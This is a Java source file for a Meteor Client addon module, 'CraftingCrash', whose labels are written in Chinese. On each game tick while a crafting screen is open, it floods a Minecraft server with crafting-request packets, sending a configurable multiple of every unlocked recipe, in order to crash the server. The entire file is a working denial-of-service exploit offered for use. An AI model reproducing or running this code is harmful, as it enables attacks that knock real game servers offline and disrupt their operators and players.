package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.RecipeEntry;
import net.minecraft.screen.CraftingScreenHandler;
import widecat.meteorcrashaddon.CrashAddon;

import java.util.List;

public class CraftingCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("发包数量")
        .description("每个刻度发送多少个数据包。警告：这将乘以解锁的配方数量")
        .defaultValue(24)
        .min(1)
        .sliderMax(50)
        .build());

    public CraftingCrash() {
        super(CrashAddon.CATEGORY, "合成崩溃", "发送大量的合成请求数据包,最好在库存中使用木板");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!(mc.player.currentScreenHandler instanceof CraftingScreenHandler) || mc.getNetworkHandler() == null) return;
        try {
            List<RecipeResultCollection> recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                for (RecipeEntry<?> recipe : recipeResultCollection.getRecipes(true)) {
                    for (int i = 0; i < packets.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(mc.player.currentScreenHandler.syncId, recipe, true));
                    }
                }
            }
        } catch (Exception ignored) {
            error("停止崩溃，因为发生了错误！");
            toggle();
        }
    }
}
